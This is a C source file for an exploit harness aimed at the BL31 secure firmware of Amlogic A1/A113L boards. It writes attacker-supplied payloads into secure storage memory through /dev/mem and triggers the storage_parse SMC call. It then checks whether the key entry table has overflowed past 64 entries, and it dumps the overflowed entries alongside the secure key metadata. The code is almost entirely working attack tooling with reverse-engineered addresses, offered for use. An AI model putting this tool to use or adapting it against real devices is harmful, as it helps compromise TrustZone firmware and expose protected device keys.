/*
 * A1 BL31 SMC interface for Linux
 *
 * Requires root and a kernel that supports SMC calls.
 * Known to work on: Khadas VIM3L and other A1 / A113L development boards
 * running Linux.
 *
 * Build:
 *   aarch64-linux-gnu-gcc -static -o a1_smc a1_linux_smc.c
 *
 * Usage:
 *   ./a1_smc read 0xfffcf5a0 32        # Read 32 bytes from address
 *   ./a1_smc write 0xfffe76b0 payload.bin  # Write payload to memory
 *   ./a1_smc parse payload.bin         # Trigger storage_parse SMC
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

/* SMC function IDs */
#define SMC_STORAGE_PARSE   0x82000069
#define SMC_KEY_READ        0x82000061
#define SMC_KEY_WRITE       0x82000062
#define SMC_EFUSE_READ      0x82000030
#define SMC_GET_CHIP_ID     0x82000044

/* A1 memory map (SRAM-based, from reverse engineering) */
#define STORAGE_AREA_BASE   0xfff8a000
#define STORAGE_AREA_SIZE   0x5000
#define KEY_ENTRIES_BASE    0xfffda920
#define KEY_ENTRIES_SIZE    0x2400

/* Inline SMC call */
static inline uint64_t smc_call(uint32_t func_id,
                                 uint64_t x1, uint64_t x2,
                                 uint64_t x3, uint64_t x4)
{
    register uint64_t r0 __asm__("x0") = func_id;
    register uint64_t r1 __asm__("x1") = x1;
    register uint64_t r2 __asm__("x2") = x2;
    register uint64_t r3 __asm__("x3") = x3;
    register uint64_t r4 __asm__("x4") = x4;

    __asm__ volatile(
        "smc #0"
        : "+r"(r0), "+r"(r1), "+r"(r2), "+r"(r3)
        : "r"(r4)
        : "memory"
    );

    return r0;
}

/* Map physical memory */
static void *map_physical(uint64_t phys_addr, size_t size)
{
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0) {
        perror("open /dev/mem");
        return NULL;
    }

    uint64_t page_offset = phys_addr & 0xFFF;
    uint64_t page_base = phys_addr & ~0xFFF;
    size_t map_size = (size + page_offset + 0xFFF) & ~0xFFF;

    void *mapped = mmap(NULL, map_size,
                        PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, page_base);
    close(fd);

    if (mapped == MAP_FAILED) {
        perror("mmap");
        return NULL;
    }

    return (char*)mapped + page_offset;
}

/* Read physical memory */
static int read_phys_mem(uint64_t addr, uint8_t *buf, size_t size)
{
    void *mapped = map_physical(addr, size);
    if (!mapped) return -1;

    memcpy(buf, mapped, size);

    uint64_t page_offset = addr & 0xFFF;
    size_t map_size = (size + page_offset + 0xFFF) & ~0xFFF;
    munmap((char*)mapped - page_offset, map_size);

    return 0;
}

/* Write physical memory */
static int write_phys_mem(uint64_t addr, const uint8_t *buf, size_t size)
{
    void *mapped = map_physical(addr, size);
    if (!mapped) return -1;

    memcpy(mapped, buf, size);

    uint64_t page_offset = addr & 0xFFF;
    size_t map_size = (size + page_offset + 0xFFF) & ~0xFFF;
    munmap((char*)mapped - page_offset, map_size);

    return 0;
}

/* Hexdump helper */
static void hexdump(const uint8_t *data, size_t len)
{
    for (size_t i = 0; i < len; i += 16) {
        printf("%08zx: ", i);
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            printf("%02x ", data[i + j]);
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            char c = data[i + j];
            printf("%c", (c >= 32 && c < 127) ? c : '.');
        }
        printf("|\n");
    }
}

/* Test SMC availability */
static int test_smc(void)
{
    printf("[*] Testing SMC interface...\n");

    /* Try to get chip ID */
    uint64_t result = smc_call(SMC_GET_CHIP_ID, 0, 0, 0, 0);

    if ((int64_t)result == -1) {
        printf("[-] SMC call failed or not available\n");
        printf("    This may require:\n");
        printf("    - Running as root\n");
        printf("    - Kernel with SMC support\n");
        printf("    - Proper EL1 -> EL3 routing\n");
        return -1;
    }

    printf("[+] SMC works! Chip ID result: 0x%lx\n", result);
    return 0;
}

/* Read memory via direct physical access */
static int cmd_read(uint64_t addr, size_t size)
{
    printf("[*] Reading 0x%zx bytes from 0x%lx\n", size, addr);

    uint8_t *buf = malloc(size);
    if (!buf) {
        perror("malloc");
        return -1;
    }

    if (read_phys_mem(addr, buf, size) == 0) {
        printf("[+] Read via /dev/mem:\n");
        hexdump(buf, size);
        free(buf);
        return 0;
    }

    printf("[-] Cannot read memory (try as root?)\n");
    free(buf);
    return -1;
}

/* Write memory from file */
static int cmd_write(uint64_t addr, const char *filename)
{
    FILE *f = fopen(filename, "rb");
    if (!f) {
        perror("fopen");
        return -1;
    }

    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    fseek(f, 0, SEEK_SET);

    uint8_t *buf = malloc(size);
    if (!buf) {
        perror("malloc");
        fclose(f);
        return -1;
    }

    if (fread(buf, 1, size, f) != size) {
        perror("fread");
        free(buf);
        fclose(f);
        return -1;
    }
    fclose(f);

    printf("[*] Writing %zu bytes to 0x%lx\n", size, addr);

    if (write_phys_mem(addr, buf, size) == 0) {
        printf("[+] Write successful\n");
        free(buf);
        return 0;
    }

    printf("[-] Write failed\n");
    free(buf);
    return -1;
}

/* Trigger storage_parse SMC */
static int cmd_parse(const char *filename)
{
    FILE *f = fopen(filename, "rb");
    if (!f) {
        perror("fopen");
        return -1;
    }

    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    fseek(f, 0, SEEK_SET);

    uint8_t *buf = malloc(size);
    if (fread(buf, 1, size, f) != size) {
        perror("fread");
        free(buf);
        fclose(f);
        return -1;
    }
    fclose(f);

    printf("[*] Loading payload (%zu bytes) to storage area\n", size);

    if (write_phys_mem(STORAGE_AREA_BASE, buf, size) != 0) {
        printf("[-] Failed to write to storage area\n");
        free(buf);
        return -1;
    }

    printf("[+] Payload written to 0x%x\n", STORAGE_AREA_BASE);
    printf("[*] Triggering SMC 0x82000069 (storage parse)...\n");

    uint64_t result = smc_call(SMC_STORAGE_PARSE, STORAGE_AREA_BASE, size, 0, 0);

    printf("[*] SMC result: 0x%lx\n", result);

    if ((int64_t)result == 0) {
        printf("[+] Storage parse completed!\n");

        /* Check key entry count */
        uint32_t count = 0;
        if (read_phys_mem(KEY_ENTRIES_BASE - 4, (uint8_t*)&count, 4) == 0) {
            printf("[*] Key entry count: %u\n", count);
            if (count > 64) {
                printf("[!!!] OVERFLOW DETECTED! Count > 64\n");
            }
        }
    } else {
        printf("[-] Storage parse failed or returned error\n");
    }

    free(buf);
    return 0;
}

/* Dump key entries */
static int cmd_dump_keys(void)
{
    printf("[*] Dumping key entries from 0x%x\n", KEY_ENTRIES_BASE);

    uint8_t *entries = malloc(KEY_ENTRIES_SIZE + 0x200);
    if (!entries) {
        perror("malloc");
        return -1;
    }

    uint32_t count = 0;
    if (read_phys_mem(KEY_ENTRIES_BASE - 4, (uint8_t*)&count, 4) != 0) {
        printf("[-] Failed to read key count\n");
        free(entries);
        return -1;
    }

    printf("[*] Key count: %u\n", count);

    size_t read_size = (count > 64 ? 66 : count) * 0x90;
    if (read_size > KEY_ENTRIES_SIZE + 0x200) {
        read_size = KEY_ENTRIES_SIZE + 0x200;
    }

    if (read_phys_mem(KEY_ENTRIES_BASE, entries, read_size) != 0) {
        printf("[-] Failed to read key entries\n");
        free(entries);
        return -1;
    }

    for (uint32_t i = 0; i < count && i < 70; i++) {
        uint8_t *entry = entries + i * 0x90;

        char name[0x51] = {0};
        memcpy(name, entry, 0x50);

        uint32_t name_len = *(uint32_t*)(entry + 0x50);
        uint32_t value_len = *(uint32_t*)(entry + 0x58);
        uint64_t value_ptr = *(uint64_t*)(entry + 0x60);
        uint32_t valid = *(uint32_t*)(entry + 0x88);

        printf("\n[Entry %u] %s%s\n", i, i >= 64 ? "(OVERFLOW) " : "",
               strlen(name) > 0 ? name : "(empty)");
        printf("  name_len:  %u\n", name_len);
        printf("  value_len: %u\n", value_len);
        printf("  value_ptr: 0x%lx\n", value_ptr);
        printf("  valid:     %u\n", valid);
    }

    free(entries);
    return 0;
}

/* Usage */
static void usage(const char *prog)
{
    fprintf(stderr, "Usage: %s <command> [args...]\n", prog);
    fprintf(stderr, "\nCommands:\n");
    fprintf(stderr, "  test                  - Test SMC availability\n");
    fprintf(stderr, "  read <addr> <size>    - Read memory\n");
    fprintf(stderr, "  write <addr> <file>   - Write file to memory\n");
    fprintf(stderr, "  parse <file>          - Load and trigger storage parse\n");
    fprintf(stderr, "  dump                  - Dump key entries\n");
    fprintf(stderr, "\nExamples:\n");
    fprintf(stderr, "  %s test\n", prog);
    fprintf(stderr, "  %s read 0xfffcf5a0 32\n", prog);
    fprintf(stderr, "  %s parse overflow_payload.bin\n", prog);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    if (geteuid() != 0) {
        fprintf(stderr, "[!] Warning: Not running as root. Some operations may fail.\n");
    }

    const char *cmd = argv[1];

    if (strcmp(cmd, "test") == 0) {
        return test_smc();
    }
    else if (strcmp(cmd, "read") == 0 && argc >= 4) {
        uint64_t addr = strtoull(argv[2], NULL, 0);
        size_t size = strtoul(argv[3], NULL, 0);
        return cmd_read(addr, size);
    }
    else if (strcmp(cmd, "write") == 0 && argc >= 4) {
        uint64_t addr = strtoull(argv[2], NULL, 0);
        return cmd_write(addr, argv[3]);
    }
    else if (strcmp(cmd, "parse") == 0 && argc >= 3) {
        return cmd_parse(argv[2]);
    }
    else if (strcmp(cmd, "dump") == 0) {
        return cmd_dump_keys();
    }
    else {
        usage(argv[0]);
        return 1;
    }

    return 0;
}
